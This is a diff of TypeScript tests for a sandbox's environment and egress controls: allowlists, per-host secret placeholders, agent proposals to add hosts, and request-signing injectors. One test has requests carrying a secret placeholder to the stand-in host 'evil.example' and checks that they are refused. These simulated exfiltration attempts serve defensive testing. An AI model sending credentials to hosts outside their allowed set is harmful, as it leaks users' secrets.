+    const o = await owner();
+    const created = ok(await call("createEnvironment", o, { name: "A" }));
+    ok(await call("createEnvironment", o, { name: "B" }));
+    expect(codeOf(await call("updateEnvironment", o, { environmentId: created.id, name: "B" }))).toBe(
+      "ENVIRONMENT_EXISTS",
+    );
+    expect(
+      codeOf(
+        await call("updateEnvironment", o, {
+          environmentId: created.id,
+          secrets: [
+            { name: "X", hosts: [] },
+            { name: "X", hosts: [] },
+          ],
+        }),
+      ),
+    ).toBe("VALIDATION_FAILED");
+    expect(
+      codeOf(
+        await call("updateEnvironment", o, { environmentId: created.id, egressAllowlist: ["Bad Host"] }),
+      ),
+    ).toBe("VALIDATION_FAILED");
+    const other = await owner();
+    expect(
+      codeOf(
+        await call("setProjectEnvironment", other, { projectId: other.projectId, environmentId: created.id }),
+      ),
+    ).toBe("NOT_FOUND");
+    const { workspaceId } = await seedWorkspace(other);
+    expect(
+      codeOf(await call("setWorkspaceEnvironment", other, { workspaceId, environmentId: created.id })),
+    ).toBe("NOT_FOUND");
+  });
+
+  it("the workspace override wins over the project's environment in getEgressConfig", async () => {
+    const o = await ownerWithEnvironment({ egressPolicy: "open" });
+    const second = ok(await call("createEnvironment", o, { name: "Strict" }));
+    ok(await call("updateEnvironment", o, { environmentId: second.id, egressAllowlist: ["pypi.org"] }));
+    const { workspaceId, stub } = await seedWorkspace(o);
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId, policy: "open" });
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: second.id }));
+    expect(await stub.getEgressConfig()).toMatchObject({
+      environmentId: second.id,
+      policy: "allowlist",
+      allowlist: ["pypi.org"],
+    });
+    expect(ok(await call("getWorkspace", o, { workspaceId })).environmentId).toBe(second.id);
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: null }));
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId });
+    // A deleted override falls back to the project's environment (01, Which environment applies).
+    ok(await call("setWorkspaceEnvironment", o, { workspaceId, environmentId: second.id }));
+    ok(await call("deleteEnvironment", o, { environmentId: second.id }));
+    expect(await stub.getEgressConfig()).toMatchObject({ environmentId: o.environmentId });
+  });
+
+  it("puts placeholders for bound secrets and values for unbound ones in env.set, and sends environment.set", async () => {
+    const o = await ownerWithEnvironment(
+      { secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }] },
+      { STRIPE_KEY: "sk_live_2", LOCAL_URL: "pg://local" },
+    );
+    const { stub, tempod } = await seedWorkspace(o);
+    await driveReady(stub);
+    await waitFor(() => tempod.requestsOf("environment.set").length > 0, 5000, "environment.set");
+    const envSet = tempod.requestsOf("env.set").at(-1).env;
+    expect(envSet).toMatchObject({ STRIPE_KEY: "tempo-secret-STRIPE_KEY", LOCAL_URL: "pg://local" });
+    expect(JSON.stringify(tempod.requestsOf("env.set"))).not.toContain("sk_live_2");
+    const summary = tempod.requestsOf("environment.set").at(-1).summary;
+    expect(summary).toMatchObject({
+      egressPolicy: "allowlist",
+      secrets: [
+        { name: "STRIPE_KEY", hosts: ["api.stripe.com"], set: true },
+        { name: "LOCAL_URL", hosts: [], set: true },
+      ],
+      blockedHosts: [],
+    });
+    expect(JSON.stringify(summary)).not.toContain("sk_live_2");
+  });
+
+  it("stores agent proposals as pending and resolves them", async () => {
+    const o = await owner();
+    const { workspaceId, stub, tempod } = await seedWorkspace(o);
+    await driveReady(stub);
+    const proposal = { note: "Tests need PyPI.", allowlistAdd: ["pypi.org"] };
+    await runInDurableObject(stub, () => tempod.emit({ kind: "environment.proposed", proposal }));
+    let pending: Row[] = [];
+    await waitFor(
+      async () => {
+        pending = ok(await call("getWorkspace", o, { workspaceId })).environmentProposals;
+        return pending.length > 0;
+      },
+      5000,
+      "pending proposal",
+    );
+    expect(pending[0]!.proposal).toEqual(proposal);
+    ok(
+      await call("resolveEnvironmentProposal", o, {
+        workspaceId,
+        proposalId: pending[0]!.id,
+        status: "applied",
+      }),
+    );
+    expect(ok(await call("getWorkspace", o, { workspaceId })).environmentProposals).toEqual([]);
+    expect(
+      codeOf(
+        await call("resolveEnvironmentProposal", o, {
+          workspaceId,
+          proposalId: pending[0]!.id,
+          status: "dismissed",
+        }),
+      ),
+    ).toBe("NOT_FOUND");
+  });
+});
+
+const sha256 = async (text: string): Promise<string> =>
+  [...new Uint8Array(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text)))]
+    .map((b) => b.toString(16).padStart(2, "0"))
+    .join("");
+
+describe("TempoOutbound rules 13 and 14 (01, Environments)", () => {
+  it("rule 14 swaps a bound secret in a header, the query and Basic auth, and logs rule 14", async () => {
+    const o = await ownerWithEnvironment(
+      { secrets: [{ name: "STRIPE_KEY", hosts: ["api.stripe.com"] }] },
+      { STRIPE_KEY: "sk_live_3" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch(
+      "https://api.stripe.com/v1/charges?key=tempo-secret-STRIPE_KEY",
+      { headers: { Authorization: "Bearer tempo-secret-STRIPE_KEY" } },
+    );
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "api.stripe.com");
+    expect(sent?.headers.get("Authorization")).toBe("Bearer sk_live_3");
+    expect(sent?.url.searchParams.get("key")).toBe("sk_live_3");
+    const basic = await outbound(workspaceId, o.userId).fetch("https://api.stripe.com/v1/x", {
+      headers: { Authorization: `Basic ${btoa("tempo-secret-STRIPE_KEY:")}` },
+    });
+    expect(basic.status).toBe(200);
+    const sentBasic = gh.upstream.at(-1)!;
+    expect(atob(sentBasic.headers.get("Authorization")!.replace("Basic ", ""))).toBe("sk_live_3:");
+    await waitFor(async () => (await egressRows(stub)).length >= 2, 5000, "egress rows");
+    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([14, 14]);
+  });
+
+  it("refuses a placeholder for another host, an unset value, or an unknown name (rule 7)", async () => {
+    const o = await ownerWithEnvironment(
+      {
+        egressPolicy: "open",
+        secrets: [
+          { name: "STRIPE_KEY", hosts: ["api.stripe.com"] },
+          { name: "UNSET", hosts: ["api.stripe.com"] },
+        ],
+      },
+      { STRIPE_KEY: "sk_live_4" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const attempts = [
+      ["https://evil.example/", "Bearer tempo-secret-STRIPE_KEY"],
+      ["https://api.stripe.com/", "Bearer tempo-secret-UNSET"],
+      ["https://api.stripe.com/", "Bearer tempo-secret-NOPE"],
+    ] as const;
+    for (const [url, auth] of attempts) {
+      const res = await outbound(workspaceId, o.userId).fetch(url, { headers: { Authorization: auth } });
+      expect(res.status).toBe(403);
+    }
+    expect(gh.upstream.length).toBe(before);
+    await waitFor(async () => (await egressRows(stub)).length >= 3, 5000, "egress rows");
+    expect((await egressRows(stub)).map((r) => r["rule"])).toEqual([7, 7, 7]);
+  });
+
+  it("rule 13 runs the injector: it gets an HMAC, its placeholders are swapped, and it cannot leave its hosts", async () => {
+    const o = await ownerWithEnvironment(
+      {
+        secrets: [{ name: "SIGN_KEY", hosts: ["signed.example"] }],
+        injectors: [{ name: "sign", hosts: ["signed.example"], code: INJECTOR_CODE }],
+      },
+      { SIGN_KEY: "k-secret" },
+    );
+    const { workspaceId, stub } = await seedWorkspace(o);
+    const before = gh.upstream.length;
+    const res = await outbound(workspaceId, o.userId).fetch("https://signed.example/upload", {
+      method: "PUT",
+      body: "x",
+    });
+    expect(res.status).toBe(200);
+    const sent = gh.upstream.slice(before).find((r) => r.url.hostname === "signed.example");
+    expect(sent?.headers.get("x-signature")).toBe(await hmacHex("k-secret", "hello"));
+    expect(sent?.headers.get("x-api-key")).toBe("k-secret");
+    const escape = await outbound(workspaceId, o.userId).fetch("https://signed.example/escape");
+    expect(escape.status).toBe(403);
+    expect(gh.upstream.some((r) => r.url.hostname === "evil.example")).toBe(false);
+    const thrown = await outbound(workspaceId, o.userId).fetch("https://signed.example/throw");
+    expect(thrown.status).toBe(502);
+    expect(await thrown.text()).toBe("tempo: injector sign failed");
+    await waitFor(async () => (await egressRows(stub)).length >= 5, 5000, "egress rows");
+    expect(new Set((await egressRows(stub)).map((r) => r["rule"]))).toEqual(new Set([13, 14]));
   });
 });
